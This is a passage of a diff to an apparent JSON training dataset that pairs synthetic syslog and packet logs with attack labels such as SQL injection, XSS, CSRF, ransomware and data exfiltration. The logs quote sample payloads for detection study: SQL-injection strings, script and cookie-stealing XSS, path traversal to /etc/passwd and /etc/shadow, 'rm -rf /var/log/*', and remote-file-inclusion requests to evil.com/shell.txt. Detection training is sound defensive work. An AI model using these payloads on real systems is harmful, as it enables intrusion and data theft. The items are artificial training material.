+      "output": "Network Port Scanning: Multiple TCP SYN and UDP packets to various ports from a single source IP, followed by a Snort alert, confirm a comprehensive port scan."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T10:45:30",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.0.2.88",
+          "dst_ip": "web-app-ip",
+          "src_port": 12351,
+          "dst_port": 80,
+          "message": "HTTP POST /transfer.php"
+        },
+        {
+          "timestamp": "2023-03-20T10:45:32",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "banking_app",
+          "message": "CSRF token missing or invalid",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T10:45:35",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "banking_app",
+          "message": "Unauthorized transfer attempt",
+          "related_ip": null
+        }
+      ],
+      "output": "Cross-Site Request Forgery (CSRF) Attack: An HTTP POST request to a sensitive endpoint, combined with a missing or invalid CSRF token and an unauthorized transfer attempt alert, indicates a CSRF attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T15:30:20",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "systemd",
+          "message": "Started session of user alice from 192.168.1.100",
+          "related_ip": "192.168.1.100"
+        },
+        {
+          "timestamp": "2023-03-20T15:30:25",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "pam",
+          "message": "User alice session hijack detected",
+          "related_ip": "203.0.113.55"
+        },
+        {
+          "timestamp": "2023-03-20T15:30:30",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "203.0.113.55",
+          "dst_ip": "server-ip",
+          "src_port": 12352,
+          "dst_port": 22,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 203.0.113.55 to server:22"
+        }
+      ],
+      "output": "Session Hijacking Attack: A user session started from one IP, followed by a session hijack detection from a different IP and a new TCP SYN packet from the suspicious IP, indicates a session hijacking attempt."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T23:15:10",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "postgresql",
+          "message": "COPY command executed: TO '/tmp/customer_data.csv'",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T23:15:15",
+          "type": "network_packet",
+          "protocol": "FTP",
+          "src_ip": "internal-server-ip",
+          "dst_ip": "203.0.113.200",
+          "src_port": 20,
+          "dst_port": 21,
+          "message": "FTP PUT /tmp/customer_data.csv"
+        },
+        {
+          "timestamp": "2023-03-20T23:15:20",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "dlp",
+          "message": "Data loss prevention alert: Sensitive customer data exported",
+          "related_ip": null
+        }
+      ],
+      "output": "Data Exfiltration Attack: A database COPY command to export data, followed by an FTP PUT operation to an external server and a DLP alert, confirms a data exfiltration attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T04:20:30",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "clamav",
+          "message": "Malware detected and quarantined: invoice.pdf.exe",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T04:20:35",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "file_monitor",
+          "message": "Mass file encryption detected",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T04:20:40",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "infected-host-ip",
+          "dst_ip": "c2-server-ip",
+          "src_port": 12353,
+          "dst_port": 80,
+          "message": "HTTP GET /ransom_note.txt"
+        }
+      ],
+      "output": "Ransomware Attack: Malware detection, mass file encryption, and an HTTP request for a ransom note indicate an active ransomware attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T10:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "auth",
+          "message": "User 'guest' logged in from 192.168.1.10",
+          "related_ip": "192.168.1.10"
+        },
+        {
+          "timestamp": "2023-03-20T10:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.1.10",
+          "dst_ip": "10.0.0.1",
+          "src_port": 50000,
+          "dst_port": 23,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 192.168.1.10 to 10.0.0.1:23 (Telnet)"
+        },
+        {
+          "timestamp": "2023-03-20T10:00:10",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "firewall",
+          "message": "Blocked outbound connection to 10.0.0.1:23 from 192.168.1.10",
+          "related_ip": "192.168.1.10"
+        }
+      ],
+      "output": "Unauthorized access attempt: A guest user logged in and immediately attempted to establish a Telnet connection to an internal server, which was subsequently blocked by the firewall, indicating suspicious activity."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T11:00:00",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "203.0.113.1",
+          "dst_ip": "255.255.255.255",
+          "src_port": 137,
+          "dst_port": 137,
+          "message": "NetBIOS Name Service query (broadcast)"
+        },
+        {
+          "timestamp": "2023-03-20T11:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "smb",
+          "message": "Failed login attempt for user 'Administrator' from 203.0.113.1",
+          "related_ip": "203.0.113.1"
+        },
+        {
+          "timestamp": "2023-03-20T11:00:10",
+          "type": "network_packet",
+          "protocol": "SMB",
+          "src_ip": "203.0.113.1",
+          "dst_ip": "10.0.0.5",
+          "src_port": 445,
+          "dst_port": 445,
+          "message": "SMB Negotiate Protocol Request"
+        }
+      ],
+      "output": "SMB enumeration and brute force attempt: A NetBIOS broadcast and failed SMB login attempts from an external IP, followed by an SMB protocol negotiation request, indicate an attempt to enumerate and brute force SMB shares."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T12:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "web_server",
+          "message": "GET /admin/config.php",
+          "related_ip": "192.168.1.20"
+        },
+        {
+          "timestamp": "2023-03-20T12:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.20",
+          "dst_ip": "web-server-ip",
+          "src_port": 50001,
+          "dst_port": 80,
+          "message": "HTTP GET /admin/config.php (403 Forbidden)"
+        },
+        {
+          "timestamp": "2023-03-20T12:00:10",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "mod_security",
+          "message": "SQL Injection attempt detected: /admin/config.php?id='OR 1=1--",
+          "related_ip": "192.168.1.20"
+        }
+      ],
+      "output": "SQL Injection attempt: An attempt to access an admin configuration page was made, followed by a 403 Forbidden response and a ModSecurity alert for a SQL injection attempt, indicating a blocked attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T13:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "web-server-ip",
+          "src_port": 50002,
+          "dst_port": 80,
+          "message": "HTTP GET /search?query=<script>alert(1)</script>"
+        },
+        {
+          "timestamp": "2023-03-20T13:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "web_app",
+          "message": "XSS payload detected in search query",
+          "related_ip": "192.168.203.243"
+        },
+        {
+          "timestamp": "2023-03-20T13:00:10",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "web-server-ip",
+          "dst_ip": "192.168.203.243",
+          "src_port": 80,
+          "dst_port": 50002,
+          "message": "HTTP 200 OK (with encoded XSS payload)"
+        }
+      ],
+      "output": "Cross-Site Scripting (XSS) Attack: An HTTP GET request containing an XSS payload was sent, detected by the web application, and the server responded with the payload, indicating a potential XSS vulnerability."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T14:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "auth",
+          "message": "User 'admin' logged in from 192.168.1.50",
+          "related_ip": "192.168.1.50"
+        },
+        {
+          "timestamp": "2023-03-20T14:00:05",
+          "type": "network_packet",
+          "protocol": "SSH",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "server-ip",
+          "src_port": 22,
+          "dst_port": 22,
+          "message": "SSH exec: rm -rf /var/log/*"
+        },
+        {
+          "timestamp": "2023-03-20T14:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "auditd",
+          "message": "File deletion detected: /var/log/syslog",
+          "related_ip": null
+        }
+      ],
+      "output": "Privilege Escalation and Log Tampering: An admin user logged in, executed a command to delete logs via SSH, and an audit alert was triggered, indicating an attempt to cover tracks after gaining elevated privileges."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T15:00:00",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "external-ip",
+          "dst_ip": "internal-ip",
+          "src_port": 10000,
+          "dst_port": 22,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from external-ip to internal-ip:22"
+        },
+        {
+          "timestamp": "2023-03-20T15:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "external-ip",
+          "dst_ip": "internal-ip",
+          "src_port": 10001,
+          "dst_port": 22,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from external-ip to internal-ip:22"
+        },
+        {
+          "timestamp": "2023-03-20T15:00:10",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "sshd",
+          "message": "Failed password for root from external-ip",
+          "related_ip": "external-ip"
+        }
+      ],
+      "output": "SSH Brute Force Attack: Multiple TCP SYN packets to the SSH port from an external IP, followed by failed password attempts for the root user, indicate a brute force attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T16:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "web_server",
+          "message": "GET /index.php?id=1",
+          "related_ip": "192.168.1.60"
+        },
+        {
+          "timestamp": "2023-03-20T16:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.60",
+          "dst_ip": "web-server-ip",
+          "src_port": 50003,
+          "dst_port": 80,
+          "message": "HTTP GET /index.php?id=' OR 1=1--"
+        },
+        {
+          "timestamp": "2023-03-20T16:00:10",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "mysql",
+          "message": "SQL error: You have an error in your SQL syntax",
+          "related_ip": null
+        }
+      ],
+      "output": "SQL Injection Attack: A normal web request followed by a request with a SQL injection payload and a subsequent SQL error in the database logs, confirms a SQL injection attempt."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T17:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "client-ip",
+          "dst_ip": "web-server-ip",
+          "src_port": 50004,
+          "dst_port": 80,
+          "message": "HTTP GET /search?q=<script>alert('XSS')</script>"
+        },
+        {
+          "timestamp": "2023-03-20T17:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "web_app_fw",
+          "message": "XSS attack blocked from client-ip",
+          "related_ip": "client-ip"
+        },
+        {
+          "timestamp": "2023-03-20T17:00:10",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "web-server-ip",
+          "dst_ip": "client-ip",
+          "src_port": 80,
+          "dst_port": 50004,
+          "message": "HTTP 403 Forbidden"
+        }
+      ],
+      "output": "Cross-Site Scripting (XSS) Attack: An HTTP request containing an XSS payload was sent, blocked by a web application firewall, and resulted in a 403 Forbidden response, indicating a successful XSS attack prevention."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T18:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "dns",
+          "message": "client 192.168.1.70: query: malware.example.com",
+          "related_ip": "192.168.1.70"
+        },
+        {
+          "timestamp": "2023-03-20T18:00:05",
+          "type": "network_packet",
+          "protocol": "DNS",
+          "src_ip": "192.168.1.70",
+          "dst_ip": "dns-server-ip",
+          "src_port": 53,
+          "dst_port": 53,
+          "message": "DNS query for malware.example.com"
+        },
+        {
+          "timestamp": "2023-03-20T18:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "ids",
+          "message": "Malicious domain lookup detected: malware.example.com",
+          "related_ip": null
+        }
+      ],
+      "output": "Command and Control (C&C) Communication: A DNS query for a known malicious domain was logged and detected by an IDS, indicating a potential C2 communication attempt."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T19:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "web-server-ip",
+          "src_port": 50005,
+          "dst_port": 80,
+          "message": "HTTP GET /include.php?file=http://evil.com/shell.txt"
+        },
+        {
+          "timestamp": "2023-03-20T19:00:05",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "php",
+          "message": "Failed to open stream: HTTP request failed!",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T19:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "waf",
+          "message": "Remote File Inclusion attempt blocked",
+          "related_ip": "192.168.203.243"
+        }
+      ],
+      "output": "Remote File Inclusion (RFI) Attack: An HTTP request attempting RFI was made, resulting in a PHP error and a WAF alert, indicating a blocked RFI attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T20:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "auth",
+          "message": "User 'john' logged in from 192.168.1.80",
+          "related_ip": "192.168.1.80"
+        },
+        {
+          "timestamp": "2023-03-20T20:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.1.80",
+          "dst_ip": "10.0.0.1",
+          "src_port": 50006,
+          "dst_port": 22,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 192.168.1.80 to 10.0.0.1:22"
+        },
+        {
+          "timestamp": "2023-03-20T20:00:10",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "sshd",
+          "message": "Failed password for root from 192.168.1.80",
+          "related_ip": "192.168.1.80"
+        }
+      ],
+      "output": "Internal reconnaissance and privilege escalation attempt: A legitimate user logged in, then attempted to SSH to another internal server as root with a failed password, indicating an attempt to gain higher privileges or move laterally."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T21:00:00",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "192.168.133.140",
+          "src_port": 53,
+          "dst_port": 53,
+          "message": "DNS query for large_response.example.com (DNS Amplification)"
+        },
+        {
+          "timestamp": "2023-03-20T21:00:05",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "dns-server-ip",
+          "dst_ip": "192.168.133.140",
+          "src_port": 53,
+          "dst_port": 12345,
+          "message": "DNS response (large)"
+        },
+        {
+          "timestamp": "2023-03-20T21:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "ids",
+          "message": "DNS amplification attack detected against 192.168.133.140",
+          "related_ip": "192.168.133.140"
+        }
+      ],
+      "output": "DNS Amplification DDoS Attack: A DNS query designed for amplification was sent, followed by a large DNS response directed at the target, and an IDS alert, confirming a DNS amplification DDoS attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T22:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "web_server",
+          "message": "GET /admin/dashboard",
+          "related_ip": "192.168.1.90"
+        },
+        {
+          "timestamp": "2023-03-20T22:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.90",
+          "dst_ip": "web-server-ip",
+          "src_port": 50007,
+          "dst_port": 80,
+          "message": "HTTP POST /admin/update_user (invalid session)"
+        },
+        {
+          "timestamp": "2023-03-20T22:00:10",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "web_app",
+          "message": "Invalid session token for user 123",
+          "related_ip": null
+        }
+      ],
+      "output": "Session Fixation/Hijacking attempt: A user accessed an admin dashboard, then attempted a sensitive action with an invalid session, indicating a potential session fixation or hijacking attempt."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T23:00:00",
+          "type": "network_packet",
+          "protocol": "SMB",
+          "src_ip": "internal-host-ip",
+          "dst_ip": "file-share-ip",
+          "src_port": 445,
+          "dst_port": 445,
+          "message": "SMB Write AndX Request (large file)"
+        },
+        {
+          "timestamp": "2023-03-20T23:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "file_monitor",
+          "message": "Large file written to sensitive share: confidential.zip",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T23:00:10",
+          "type": "network_packet",
+          "protocol": "FTP",
+          "src_ip": "internal-host-ip",
+          "dst_ip": "external-ftp-server-ip",
+          "src_port": 20,
+          "dst_port": 21,
+          "message": "FTP PUT /confidential.zip"
+        }
+      ],
+      "output": "Data Exfiltration via File Share and FTP: A large file was written to a sensitive network share, detected by a file monitor, and then immediately transferred via FTP to an external server, indicating data exfiltration."
     }
   ],
   "vulnerability_classification": [
@@ -860,7 +2131,7 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T15:23:45.000000",
+          "timestamp": "2023-04-10T15:23:45",
           "type": "syslog",
           "log_level": "INFO",
           "component": "su",
@@ -868,7 +2139,7 @@
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T15:23:46.000000",
+          "timestamp": "2023-04-10T15:23:46",
           "type": "syslog",
           "log_level": "INFO",
           "component": "sudo",
@@ -876,7 +2147,7 @@
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T15:23:47.000000",
+          "timestamp": "2023-04-10T15:23:47",
           "type": "syslog",
           "log_level": "INFO",
           "component": "sudo",
@@ -891,38 +2162,63 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T08:15:30.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.89 - - [10/Apr/2023:08:15:30 +0000] \"GET /index.php?page=../../../../etc/passwd HTTP/1.1\" 200 2048",
-          "related_ip": "203.0.113.89"
+          "timestamp": "2023-04-10T11:15:30",
+          "type": "network_packet",
+          "protocol": "ICMP",
+          "src_ip": "198.51.100.75",
+          "dst_ip": "10.0.0.5",
+          "message": "ICMP echo request, id 12345, seq 1, length 65507"
         },
         {
-          "timestamp": "2023-04-10T08:15:32.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.89 - - [10/Apr/2023:08:15:32 +0000] \"GET /index.php?page=../../../../etc/shadow HTTP/1.1\" 200 1024",
-          "related_ip": "203.0.113.89"
+          "timestamp": "2023-04-10T11:15:31",
+          "type": "network_packet",
+          "protocol": "ICMP",
+          "src_ip": "198.51.100.75",
+          "dst_ip": "10.0.0.5",
+          "message": "ICMP echo request, id 12345, seq 2, length 65507"
         },
         {
-          "timestamp": "2023-04-10T08:15:35.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.89 - - [10/Apr/2023:08:15:35 +0000] \"GET /index.php?page=../../../../var/www/.htpasswd HTTP/1.1\" 200 512",
-          "related_ip": "203.0.113.89"
+          "timestamp": "2023-04-10T11:15:32",
+          "type": "network_packet",
+          "protocol": "ICMP",
+          "src_ip": "198.51.100.75",
+          "dst_ip": "10.0.0.5",
+          "message": "ICMP echo request, id 12345, seq 3, length 65507"
         }
       ],
-      "output": "Local File Inclusion (LFI) Attack"
+      "output": "Ping of Death Attack"
     },
     {
       "type": "classification",
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T12:30:15.000000",
+          "timestamp": "2023-05-03T12:00:00",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "203.0.113.1",
+          "dst_ip": "10.0.0.1",
+          "src_port": 53,
+          "dst_port": 53,
+          "message": "DNS query for malicious.example.com"
+        },
+        {
+          "timestamp": "2023-05-03T12:00:05",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "ids",
+          "message": "DNS exfiltration attempt detected: query for known C2 domain malicious.example.com",
+          "related_ip": "203.0.113.1"
+        }
+      ],
+      "output": "DNS Exfiltration Attempt"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T12:30:15",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "sshd",
@@ -930,7 +2226,7 @@
           "related_ip": "198.51.100.25"
         },
         {
-          "timestamp": "2023-04-10T12:30:18.000000",
+          "timestamp": "2023-04-10T12:30:18",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "sshd",
@@ -938,7 +2234,7 @@
           "related_ip": "198.51.100.25"
         },
         {
-          "timestamp": "2023-04-10T12:30:21.000000",
+          "timestamp": "2023-04-10T12:30:21",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "sshd",
@@ -946,7 +2242,7 @@
           "related_ip": "198.51.100.25"
         },
         {
-          "timestamp": "2023-04-10T12:30:24.000000",
+          "timestamp": "2023-04-10T12:30:24",
           "type": "syslog",
           "log_level": "INFO",
           "component": "sshd",
@@ -961,28 +2257,32 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T19:45:20.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.0.2.150 - - [10/Apr/2023:19:45:20 +0000] \"POST /login.php HTTP/1.1\" 200 1024",
-          "related_ip": "192.0.2.150"
+          "timestamp": "2023-04-10T19:45:20",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.0.2.150",
+          "dst_ip": "web-server-ip",
+          "src_port": 12354,
+          "dst_port": 80,
+          "message": "HTTP POST /login.php"
         },
         {
-          "timestamp": "2023-04-10T19:45:22.000000",
-          "type": "database",
+          "timestamp": "2023-04-10T19:45:22",
+          "type": "syslog",
           "log_level": "ERROR",
           "component": "mysql",
           "message": "Query: SELECT * FROM users WHERE username='admin' AND password='password' OR '1'='1'-- '",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T19:45:23.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.0.2.150 - - [10/Apr/2023:19:45:23 +0000] \"GET /admin/dashboard.php HTTP/1.1\" 200 4096",
-          "related_ip": "192.0.2.150"
+          "timestamp": "2023-04-10T19:45:23",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.0.2.150",
+          "dst_ip": "web-server-ip",
+          "src_port": 12355,
+          "dst_port": 80,
+          "message": "HTTP GET /admin/dashboard.php"
         }
       ],
       "output": "SQL Injection Attack"
@@ -992,28 +2292,34 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T16:20:10.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.45 - - [10/Apr/2023:16:20:10 +0000] \"GET /search.php?q=<script>alert('XSS')</script> HTTP/1.1\" 200 2048",
-          "related_ip": "203.0.113.45"
+          "timestamp": "2023-04-10T16:20:10",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.45",
+          "dst_ip": "web-server-ip",
+          "src_port": 12356,
+          "dst_port": 80,
+          "message": "HTTP GET /search.php?q=<script>alert('XSS')</script>"
         },
         {
-          "timestamp": "2023-04-10T16:20:12.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.45 - - [10/Apr/2023:16:20:12 +0000] \"GET /comment.php?msg=<img src=x onerror=alert(document.cookie)> HTTP/1.1\" 200 1536",
-          "related_ip": "203.0.113.45"
+          "timestamp": "2023-04-10T16:20:12",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.45",
+          "dst_ip": "web-server-ip",
+          "src_port": 12357,
+          "dst_port": 80,
+          "message": "HTTP GET /comment.php?msg=<img src=x onerror=alert(document.cookie)>"
         },
         {
-          "timestamp": "2023-04-10T16:20:15.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.45 - - [10/Apr/2023:16:20:15 +0000] \"POST /feedback.php HTTP/1.1\" 200 512",
-          "related_ip": "203.0.113.45"
+          "timestamp": "2023-04-10T16:20:15",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.45",
+          "dst_ip": "web-server-ip",
+          "src_port": 12358,
+          "dst_port": 80,
+          "message": "HTTP POST /feedback.php"
         }
       ],
       "output": "Cross-Site Scripting (XSS) Attack"
@@ -1023,54 +2329,27 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T11:15:30.000000",
-          "type": "network",
-          "log_level": "INFO",
-          "component": "tcpdump",
-          "message": "198.51.100.75 > 10.0.0.5: ICMP echo request, id 12345, seq 1, length 64",
-          "related_ip": "198.51.100.75"
-        },
-        {
-          "timestamp": "2023-04-10T11:15:31.000000",
-          "type": "network",
-          "log_level": "INFO",
-          "component": "tcpdump",
-          "message": "198.51.100.75 > 10.0.0.5: ICMP echo request, id 12345, seq 2, length 1024",
-          "related_ip": "198.51.100.75"
-        },
-        {
-          "timestamp": "2023-04-10T11:15:32.000000",
-          "type": "network",
-          "log_level": "INFO",
-          "component": "tcpdump",
-          "message": "198.51.100.75 > 10.0.0.5: ICMP echo request, id 12345, seq 3, length 65507",
-          "related_ip": "198.51.100.75"
-        }
-      ],
-      "output": "Ping of Death Attack"
-    },
-    {
-      "type": "classification",
-      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
-      "input": [
-        {
-          "timestamp": "2023-04-10T14:30:45.000000",
-          "type": "dns",
+          "timestamp": "2023-04-10T14:30:45",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "named",
           "message": "client 192.0.2.200: query: 3347a3b3.malware-domain.com IN A +",
           "related_ip": "192.0.2.200"
         },
         {
-          "timestamp": "2023-04-10T14:30:50.000000",
-          "type": "network",
-          "log_level": "INFO",
-          "component": "netstat",
-          "message": "tcp 0 0 10.0.0.15:45678 3347a3b3.malware-domain.com:443 ESTABLISHED",
-          "related_ip": null
+          "timestamp": "2023-04-10T14:30:50",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "10.0.0.15",
+          "dst_ip": "3347a3b3.malware-domain.com-ip",
+          "src_port": 45678,
+          "dst_port": 443,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet to C2 server"
         },
         {
-          "timestamp": "2023-04-10T14:31:00.000000",
+          "timestamp": "2023-04-10T14:31:00",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "antivirus",
@@ -1085,26 +2364,30 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T09:20:15.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.120 - - [10/Apr/2023:09:20:15 +0000] \"GET /upload.php?file=../../../etc/passwd%00.jpg HTTP/1.1\" 200 2048",
-          "related_ip": "203.0.113.120"
+          "timestamp": "2023-04-10T09:20:15",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.120",
+          "dst_ip": "web-server-ip",
+          "src_port": 12359,
+          "dst_port": 80,
+          "message": "HTTP GET /upload.php?file=../../../etc/passwd%00.jpg"
         },
         {
-          "timestamp": "2023-04-10T09:20:18.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.120 - - [10/Apr/2023:09:20:18 +0000] \"GET /include.php?path=http://evil.com/shell.txt? HTTP/1.1\" 200 1024",
-          "related_ip": "203.0.113.120"
+          "timestamp": "2023-04-10T09:20:18",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.120",
+          "dst_ip": "web-server-ip",
